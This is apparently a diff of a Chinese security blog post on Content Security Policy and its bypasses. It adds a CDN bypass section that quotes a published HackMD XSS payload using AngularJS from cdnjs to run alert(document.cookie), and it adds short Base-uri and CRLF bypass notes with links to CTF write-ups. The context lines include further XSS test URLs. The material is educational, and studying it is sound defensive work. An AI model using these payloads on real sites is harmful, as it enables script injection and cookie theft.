@@ -271,7 +271,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">836</span> / Reading time: <span class="post-count">4 min</span></span>
+                        <span>Word count: <span class="post-count">989</span> / Reading time: <span class="post-count">5 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -419,7 +419,7 @@ height:50vh;
 <p><img src="/csp/2.png" alt="1"></p>
 <h2 id="How-To-Defence-XSS"><a href="#How-To-Defence-XSS" class="headerlink" title="How To Defence XSS"></a>How To Defence XSS</h2><p>比如有如下代码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Security-Policy: default-src &apos;self&apos; &apos;unsafe-eval&apos;; script-src &apos;self&apos; &quot;);</span><br><span class="line">echo $_GET[&apos;a&apos;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="/csp/3.png" alt="1"></p>
+<p><img src="/csp/6.png" alt="1"><br><img src="/csp/3.png" alt="1"></p>
 <h2 id="Bypass-CSP"><a href="#Bypass-CSP" class="headerlink" title="Bypass CSP"></a>Bypass CSP</h2><h3 id="Jsonp-bypass"><a href="#Jsonp-bypass" class="headerlink" title="Jsonp bypass"></a>Jsonp bypass</h3><p>例如：在回调函数中包装js对象的jsonp接口通常允许通过第三方域的脚本作为源数据来加载api数据</p>
 <p>csp.php</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Security-Policy: default-src &apos;self&apos; script-src &apos;self&apos; &quot;);</span><br><span class="line">echo $_GET[&apos;a&apos;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
@@ -438,6 +438,10 @@ height:50vh;
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://b.hu3sky.com/eval.js&quot;&gt;dns-prefe</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a.hu3sky.com/csp.php?a=%3Clink%20rel=%22dns-prefetch%22%20href=%22http://b.hu3sky.com/eval.js%22%3E</span><br></pre></td></tr></table></figure>
 <h4 id="script-location"><a href="#script-location" class="headerlink" title="script location"></a>script location</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.hu3sky.com/csp.php?a=&lt;script&gt;window.location=&quot;http://b.hu3sky.com/eval.js&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="CDN-bypass"><a href="#CDN-bypass" class="headerlink" title="CDN bypass"></a>CDN bypass</h3><p>在orange师傅的这篇文章中，<a href="https://paper.seebug.org/855/" target="_blank" rel="noopener">https://paper.seebug.org/855/</a><br>他发现了HackMD存在的XSS，通过HackMD对注释<code>&lt;!-- --&gt;</code>的信任，去闭合注释标签 造成xss<br>关键代码<br><img src="/csp/7.png" alt="1"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- foo = &quot;aaa--&gt; &lt;h1&gt;AAA&lt;/h1&gt; &quot;--&gt;</span><br></pre></td></tr></table></figure></p>
+<p>不过有CSP需要绕过,HackMD给出的CSP信任名单有一个CDN <code>https://cdnjs.cloudflare.com</code><br>最终的攻击代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- foo=&quot;--&gt;&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;&lt;/script&gt;&lt;div ng-app&gt;</span><br><span class="line">    &#123;&#123;constructor.constructor(&apos;alert(document.cookie)&apos;)()&#125;&#125;&lt;/div&gt;</span><br><span class="line">//sssss&quot; --&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="Base-uri-bypass"><a href="#Base-uri-bypass" class="headerlink" title="Base-uri bypass"></a>Base-uri bypass</h3><p><a href="https://blog.cal1.cn/post/RCTF%202018%20rBlog%20writeup" target="_blank" rel="noopener">https://blog.cal1.cn/post/RCTF%202018%20rBlog%20writeup</a></p>
+<h3 id="CRLF-bypass"><a href="#CRLF-bypass" class="headerlink" title="CRLF bypass"></a>CRLF bypass</h3><p>当存在CRLF的点在csp规则上方<br>即可插入<code>&lt;script&gt;</code>进行xss<br><a href="https://github.com/Lou00/HCTF2018_Bottle" target="_blank" rel="noopener">https://github.com/Lou00/HCTF2018_Bottle</a></p>
 <h1 id="Referers"><a href="#Referers" class="headerlink" title="Referers"></a>Referers</h1><ul>
 <li><a href="https://xz.aliyun.com/t/318" target="_blank" rel="noopener">https://xz.aliyun.com/t/318</a></li>
 <li><a href="http://stamone-bug-bounty.blogspot.com/2017/10/dom-xss-auth14.html" target="_blank" rel="noopener">http://stamone-bug-bounty.blogspot.com/2017/10/dom-xss-auth14.html</a></li>
@@ -604,7 +608,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Content-Security-Policy-amp-Bypass"><span class="toc-number">1.</span> <span class="toc-text">Content Security Policy&amp;Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Use-CSP"><span class="toc-number">1.1.</span> <span class="toc-text">Use CSP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-To-Defence-XSS"><span class="toc-number">1.2.</span> <span class="toc-text">How To Defence XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-CSP"><span class="toc-number">1.3.</span> <span class="toc-text">Bypass CSP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Jsonp-bypass"><span class="toc-number">1.3.1.</span> <span class="toc-text">Jsonp bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Url-Redirect-Jsonp-bypass"><span class="toc-number">1.3.2.</span> <span class="toc-text">Url Redirect + Jsonp bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-upload-bypass"><span class="toc-number">1.3.3.</span> <span class="toc-text">file upload bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsafe-inline-bypass"><span class="toc-number">1.3.4.</span> <span class="toc-text">unsafe-inline bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#link-bypass"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">link bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#script-location"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">script location</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Referers"><span class="toc-number">2.</span> <span class="toc-text">Referers</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Content-Security-Policy-amp-Bypass"><span class="toc-number">1.</span> <span class="toc-text">Content Security Policy&amp;Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Use-CSP"><span class="toc-number">1.1.</span> <span class="toc-text">Use CSP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-To-Defence-XSS"><span class="toc-number">1.2.</span> <span class="toc-text">How To Defence XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-CSP"><span class="toc-number">1.3.</span> <span class="toc-text">Bypass CSP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Jsonp-bypass"><span class="toc-number">1.3.1.</span> <span class="toc-text">Jsonp bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Url-Redirect-Jsonp-bypass"><span class="toc-number">1.3.2.</span> <span class="toc-text">Url Redirect + Jsonp bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-upload-bypass"><span class="toc-number">1.3.3.</span> <span class="toc-text">file upload bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsafe-inline-bypass"><span class="toc-number">1.3.4.</span> <span class="toc-text">unsafe-inline bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#link-bypass"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">link bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#script-location"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">script location</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CDN-bypass"><span class="toc-number">1.3.5.</span> <span class="toc-text">CDN bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Base-uri-bypass"><span class="toc-number">1.3.6.</span> <span class="toc-text">Base-uri bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CRLF-bypass"><span class="toc-number">1.3.7.</span> <span class="toc-text">CRLF bypass</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Referers"><span class="toc-number">2.</span> <span class="toc-text">Referers</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -617,6 +621,70 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     
     
     
@@ -2047,12 +2115,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/10</span><a class="archive-post-title" href= "/2018/04/10/1个月学习计划/" >1个月学习计划</a>
+            <span class="archive-post-date">04/10</span><a class="archive-post-title" href= "/2018/04/10/scrapy笔记/" >Scrapy笔记</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/10</span><a class="archive-post-title" href= "/2018/04/10/scrapy笔记/" >Scrapy笔记</a>
+            <span class="archive-post-date">04/10</span><a class="archive-post-title" href= "/2018/04/10/1个月学习计划/" >1个月学习计划</a>
         </li>
     
     
@@ -2086,16 +2154,6 @@ top:50vh;
         </li>
     
     
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/11</span><a class="archive-post-title" href= "/2018/01/11/tp5/" >Thinkphp5.* getshell 分析</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/11</span><a class="archive-post-title" href= "/2018/01/11/PHPCMS2008/" >PHPCMS2008_getshell</a>
-        </li>
-    
-    
     
     
     
@@ -2107,6 +2165,25 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/04/18/Broad Crawls~Benchmarking/" >[Untitled Post]</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/11</span><a class="archive-post-title" href= "/2018/01/11/tp5/" >Thinkphp5.* getshell 分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/11</span><a class="archive-post-title" href= "/2018/01/11/PHPCMS2008/" >PHPCMS2008_getshell</a>
         </li>
     
     </div>
@@ -2147,15 +2224,15 @@ jsonContent:
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
     
-        <span class="sidebar-category-name" data-categories="学习计划"><span class="iconfont-archer">&#xe60a;</span>学习计划</span>
-    
         <span class="sidebar-category-name" data-categories="CTF"><span class="iconfont-archer">&#xe60a;</span>CTF</span>
+    
+        <span class="sidebar-category-name" data-categories="学习计划"><span class="iconfont-archer">&#xe60a;</span>学习计划</span>
     
         <span class="sidebar-category-name" data-categories="渗透测试"><span class="iconfont-archer">&#xe60a;</span>渗透测试</span>
     
-        <span class="sidebar-category-name" data-categories="浏览器安全"><span class="iconfont-archer">&#xe60a;</span>浏览器安全</span>
-    
         <span class="sidebar-category-name" data-categories="备忘录"><span class="iconfont-archer">&#xe60a;</span>备忘录</span>
+    
+        <span class="sidebar-category-name" data-categories="浏览器安全"><span class="iconfont-archer">&#xe60a;</span>浏览器安全</span>
     
         <span class="sidebar-category-name" data-categories="代码审计"><span class="iconfont-archer">&#xe60a;</span>代码审计</span>
     
@@ -2167,37 +2244,37 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="CVE-Request"><span class="iconfont-archer">&#xe60a;</span>CVE-Request</span>
     
-        <span class="sidebar-category-name" data-categories="sql注入"><span class="iconfont-archer">&#xe60a;</span>sql注入</span>
+        <span class="sidebar-category-name" data-categories="漏洞分析"><span class="iconfont-archer">&#xe60a;</span>漏洞分析</span>
     
         <span class="sidebar-category-name" data-categories="http协议"><span class="iconfont-archer">&#xe60a;</span>http协议</span>
     
-        <span class="sidebar-category-name" data-categories="Empire"><span class="iconfont-archer">&#xe60a;</span>Empire</span>
-    
-        <span class="sidebar-category-name" data-categories="漏洞分析"><span class="iconfont-archer">&#xe60a;</span>漏洞分析</span>
-    
         <span class="sidebar-category-name" data-categories="write-up"><span class="iconfont-archer">&#xe60a;</span>write-up</span>
+    
+        <span class="sidebar-category-name" data-categories="Empire"><span class="iconfont-archer">&#xe60a;</span>Empire</span>
     
         <span class="sidebar-category-name" data-categories="git"><span class="iconfont-archer">&#xe60a;</span>git</span>
     
         <span class="sidebar-category-name" data-categories="php反序列化"><span class="iconfont-archer">&#xe60a;</span>php反序列化</span>
     
+        <span class="sidebar-category-name" data-categories="内网渗透"><span class="iconfont-archer">&#xe60a;</span>内网渗透</span>
+    
         <span class="sidebar-category-name" data-categories="JavaScript"><span class="iconfont-archer">&#xe60a;</span>JavaScript</span>
     
         <span class="sidebar-category-name" data-categories="python"><span class="iconfont-archer">&#xe60a;</span>python</span>
     
+        <span class="sidebar-category-name" data-categories="sql注入"><span class="iconfont-archer">&#xe60a;</span>sql注入</span>
+    
         <span class="sidebar-category-name" data-categories="scrapy"><span class="iconfont-archer">&#xe60a;</span>scrapy</span>
-    
-        <span class="sidebar-category-name" data-categories="内网渗透"><span class="iconfont-archer">&#xe60a;</span>内网渗透</span>
-    
-        <span class="sidebar-category-name" data-categories="内网"><span class="iconfont-archer">&#xe60a;</span>内网</span>
     
         <span class="sidebar-category-name" data-categories="代码执行"><span class="iconfont-archer">&#xe60a;</span>代码执行</span>
     
-        <span class="sidebar-category-name" data-categories="域渗透"><span class="iconfont-archer">&#xe60a;</span>域渗透</span>
+        <span class="sidebar-category-name" data-categories="后门"><span class="iconfont-archer">&#xe60a;</span>后门</span>
+    
+        <span class="sidebar-category-name" data-categories="内网"><span class="iconfont-archer">&#xe60a;</span>内网</span>
     
         <span class="sidebar-category-name" data-categories="线下赛"><span class="iconfont-archer">&#xe60a;</span>线下赛</span>
     
-        <span class="sidebar-category-name" data-categories="后门"><span class="iconfont-archer">&#xe60a;</span>后门</span>
+        <span class="sidebar-category-name" data-categories="域渗透"><span class="iconfont-archer">&#xe60a;</span>域渗透</span>
     
         <span class="sidebar-category-name" data-categories="xxe"><span class="iconfont-archer">&#xe60a;</span>xxe</span>
     
